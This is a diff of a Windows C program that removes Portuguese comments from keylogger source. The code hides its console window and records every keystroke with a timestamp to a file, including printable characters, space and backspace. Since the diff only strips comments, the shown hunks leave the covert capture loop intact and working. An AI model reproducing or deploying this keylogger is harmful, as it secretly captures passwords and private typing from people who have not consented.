@@ -17,7 +17,7 @@ int main()
     FILE *arquivo;
     int t;
     char datetime[20];
-    char keyState[256] = {0}; // Array para guardar o estado das teclas
+    char keyState[256] = {0}; 
 
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -35,13 +35,13 @@ int main()
         {
             if ((GetAsyncKeyState(t) & 0x8000) && !keyState[t])
             {
-                keyState[t] = 1; // Marca a tecla como pressionada
+                keyState[t] = 1; 
 
-                getDateTime(datetime, sizeof(datetime)); // Sempre pega a hora
+                getDateTime(datetime, sizeof(datetime)); 
 
                 if (t >= 32 && t <= 126)
                 {
-                    // Teclas "normais" (letras, números e pontuação)
+                    
                     fprintf(arquivo, "[%s] %c\n", datetime, (char)t);
                 }
                 else if (t == VK_SPACE)
@@ -61,10 +61,10 @@ int main()
                     fprintf(arquivo, "[%s] [BACKSPACE]\n", datetime);
                 }
             }
-            // Verifica se a tecla foi liberada (deixa de ser pressionada)
+            
             else if (!(GetAsyncKeyState(t) & 0x8000) && keyState[t])
             {
-                keyState[t] = 0; // Marca a tecla como liberada
+                keyState[t] = 0; 
             }
         }
 
